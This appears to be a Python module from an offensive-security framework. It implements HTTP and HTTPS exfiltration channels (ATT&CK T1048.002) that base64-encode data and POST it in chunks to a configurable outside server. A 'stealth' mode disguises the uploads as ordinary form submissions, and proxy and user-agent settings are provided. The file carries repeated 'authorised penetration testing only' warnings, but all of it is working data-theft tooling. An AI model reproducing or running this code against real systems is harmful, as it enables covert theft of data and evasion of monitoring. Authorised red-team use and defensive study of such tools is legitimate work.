#!/usr/bin/env python3
"""
HTTP/HTTPS 外泄通道 - HTTP/HTTPS Exfiltration Channel
ATT&CK Technique: T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

通过 HTTP/HTTPS 协议进行数据外泄
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

import base64
import logging
from typing import Union

from ..base import (
    BaseExfiltration,
    ExfilChannel,
    ExfilConfig,
)

logger = logging.getLogger(__name__)


class HTTPExfiltration(BaseExfiltration):
    """
    HTTP 外泄通道

    通过 HTTP POST 请求发送数据

    Warning: 仅限授权渗透测试使用！
    """

    name = "http_exfil"
    description = "HTTP Exfiltration Channel"
    channel = ExfilChannel.HTTP

    def __init__(self, config: ExfilConfig):
        super().__init__(config)
        self._session = None
        self._chunk_id = 0
        self._transfer_id = ""

    def _get_ssl_verify(self) -> Union[bool, str]:
        """
        获取SSL验证配置

        Returns:
            bool | str: True启用验证, False禁用验证, str为证书路径
        """
        # 优先使用自定义证书路径
        if self.config.ssl_cert_path:
            # 验证证书文件是否存在
            from pathlib import Path

            cert_path = Path(self.config.ssl_cert_path)
            if not cert_path.exists():
                self.logger.warning(
                    f"SSL certificate not found: {self.config.ssl_cert_path}, falling back to verify_ssl"
                )
                return self.config.verify_ssl
            if not cert_path.is_file():
                self.logger.warning(
                    f"SSL certificate path is not a file: {self.config.ssl_cert_path}, falling back to verify_ssl"
                )
                return self.config.verify_ssl
            return str(cert_path)

        # 使用配置的验证开关
        return self.config.verify_ssl

    def connect(self) -> bool:
        """建立 HTTP 连接"""
        try:
            import uuid

            import requests

            self._session = requests.Session()

            # 设置 headers
            self._session.headers.update(
                {
                    "User-Agent": self.config.user_agent,
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                }
            )

            # 设置代理
            if self.config.proxy:
                self._session.proxies = {
                    "http": self.config.proxy,
                    "https": self.config.proxy,
                }

            # 生成传输 ID
            self._transfer_id = str(uuid.uuid4())[:8]
            self._chunk_id = 0

            # 测试连接
            try:
                # 安全：使用配置的SSL验证设置
                verify = self._get_ssl_verify()

                # 安全警告：当禁用SSL验证时
                if not verify and self.config.destination.startswith("https://"):
                    self.logger.warning(
                        "⚠️  SSL verification is disabled for HTTPS connection. "
                        "This is insecure and should only be used in testing environments."
                    )

                response = self._session.head(
                    self.config.destination, timeout=self.config.timeout, verify=verify
                )
                return response.status_code < 500
            except requests.exceptions.SSLError as e:
                # SSL错误必须失败
                self.logger.error(f"SSL verification failed: {e}")
                return False
            except requests.RequestException as e:
                # 其他网络错误可以容忍，在实际发送时重试
                self.logger.warning(f"Connection test failed: {e}, will retry on send")
                return True

        except ImportError:
            self.logger.error("requests library not available")
            return False
        except Exception as e:
            self.logger.error(f"Connection failed: {e}")
            return False

    def disconnect(self) -> None:
        """关闭连接"""
        if self._session:
            self._session.close()
            self._session = None

    def send_chunk(self, data: bytes) -> bool:
        """
        发送数据块

        Args:
            data: 数据块

        Returns:
            是否成功
        """
        if not self._session:
            return False

        try:
            import requests

            # 编码数据
            encoded_data = base64.b64encode(data).decode("ascii")

            # 构建请求
            url = self.config.destination

            if self.config.stealth:
                # 隐蔽模式：伪装成正常请求
                payload = {
                    "action": "upload",
                    "session": self._transfer_id,
                    "seq": self._chunk_id,
                    "data": encoded_data,
                }

                response = self._session.post(
                    url, data=payload, timeout=self.config.timeout, verify=self._get_ssl_verify()
                )
            else:
                # 直接模式
                headers = {
                    "X-Transfer-Id": self._transfer_id,
                    "X-Chunk-Id": str(self._chunk_id),
                    "Content-Type": "application/octet-stream",
                }

                response = self._session.post(
                    url,
                    data=data,
                    headers=headers,
                    timeout=self.config.timeout,
                    verify=self._get_ssl_verify(),
                )

            self._chunk_id += 1

            return response.status_code in (200, 201, 202, 204)

        except requests.RequestException as e:
            self.logger.warning(f"Send chunk failed: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Unexpected error: {e}")
            return False


class HTTPSExfiltration(HTTPExfiltration):
    """
    HTTPS 外泄通道

    通过加密的 HTTPS 连接发送数据

    Warning: 仅限授权渗透测试使用！
    """

    name = "https_exfil"
    description = "HTTPS Exfiltration Channel"
    channel = ExfilChannel.HTTPS

    def connect(self) -> bool:
        """建立 HTTPS 连接"""
        # 确保使用 HTTPS
        if not self.config.destination.startswith("https://"):
            if self.config.destination.startswith("http://"):
                self.config.destination = self.config.destination.replace("http://", "https://")
            else:
                self.config.destination = f"https://{self.config.destination}"

        return super().connect()


__all__ = ["HTTPExfiltration", "HTTPSExfiltration"]
